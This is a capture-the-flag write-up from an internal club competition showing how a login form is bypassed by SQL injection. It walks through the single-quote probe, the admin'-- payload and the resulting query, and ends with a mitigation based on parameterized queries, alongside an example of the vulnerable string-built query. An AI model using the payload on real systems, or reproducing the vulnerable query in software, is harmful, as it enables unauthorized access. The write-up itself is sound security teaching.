---
title: "SQL Injection: Authentication Bypass"
description: "A beginner-friendly walkthrough of exploiting a classic SQL injection vulnerability to bypass login authentication."
pubDate: 2024-12-10
category: "web"
difficulty: "easy"
ctf: "CyberClub Internal CTF 2024"
author: "Alex Chen"
tags: ["sql-injection", "authentication", "web-security"]
---

## Challenge Overview

We're presented with a simple login form at `http://challenge.cyberclub.local/login`. The goal is to gain access to the admin panel without knowing the password.

## Initial Reconnaissance

Let's examine the login form:

```html
<form action="/login" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
```

Testing with some common credentials like `admin:admin` gives us an error message: "Invalid credentials."

## Finding the Vulnerability

Let's try injecting a single quote (`'`) into the username field:

```
Username: admin'
Password: password
```

The application returns a database error:

```
SQL Error: You have an error in your SQL syntax near '' at line 1
```

Perfect! This confirms the application is vulnerable to SQL injection. The backend query likely looks something like this:

```sql
SELECT * FROM users WHERE username='admin'' AND password='password'
```

## Exploitation

To bypass authentication, we need to comment out the password check. Let's use the classic SQL injection payload:

```
Username: admin'--
Password: (anything)
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
```

Everything after `--` is treated as a comment, effectively removing the password check!

## Success!

After submitting the payload, we're logged in as admin and can retrieve the flag:

```
flag{sql_1nj3ct10n_1s_st1ll_r3l3v4nt}
```

## Key Takeaways

1. **Always sanitize user input** - Never trust data from users
2. **Use parameterized queries** - Prepared statements prevent SQL injection
3. **Error messages matter** - Verbose errors can leak implementation details
4. **Input validation** - Whitelist allowed characters when possible

## Mitigation

Here's how the vulnerable code should be fixed using parameterized queries:

```python
# Vulnerable code
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# Secure code
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

---

*Want to practice SQL injection? Check out [SQLi Labs](https://github.com/Audi-1/sqli-labs) and [PortSwigger Academy](https://portswigger.net/web-security/sql-injection)!*
